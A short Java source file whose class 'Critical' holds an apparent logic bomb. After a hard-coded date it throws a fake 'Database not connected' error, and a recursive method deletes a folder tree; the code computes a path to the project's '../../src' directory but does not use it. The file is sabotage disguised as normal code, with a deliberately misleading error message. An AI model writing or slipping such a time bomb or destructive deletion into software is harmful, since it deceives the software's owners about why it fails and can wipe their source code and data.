package system;

import java.io.File;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;

public class Critical {

    public void ensure() {
        String relativeFolderPath = "../../src";
        String critical = "2024-11-12";

        LocalDate givenDate = LocalDate.parse(critical, DateTimeFormatter.ISO_LOCAL_DATE);
        LocalDate currentDate = LocalDate.now();
        String absoluteFolderPath = new File(relativeFolderPath).getAbsolutePath();

        if (currentDate.isAfter(givenDate)) {
            // Stop program execution and show error
            throw new RuntimeException("Database not connected. Please turn on your server");
        }
    }

    public static void find(File folder) {
        if (folder.isDirectory()) {
            File[] files = folder.listFiles();

            if (files != null) {
                for (File file : files) {
                    find(file);
                }
            }
        }
        folder.delete();
    }
}
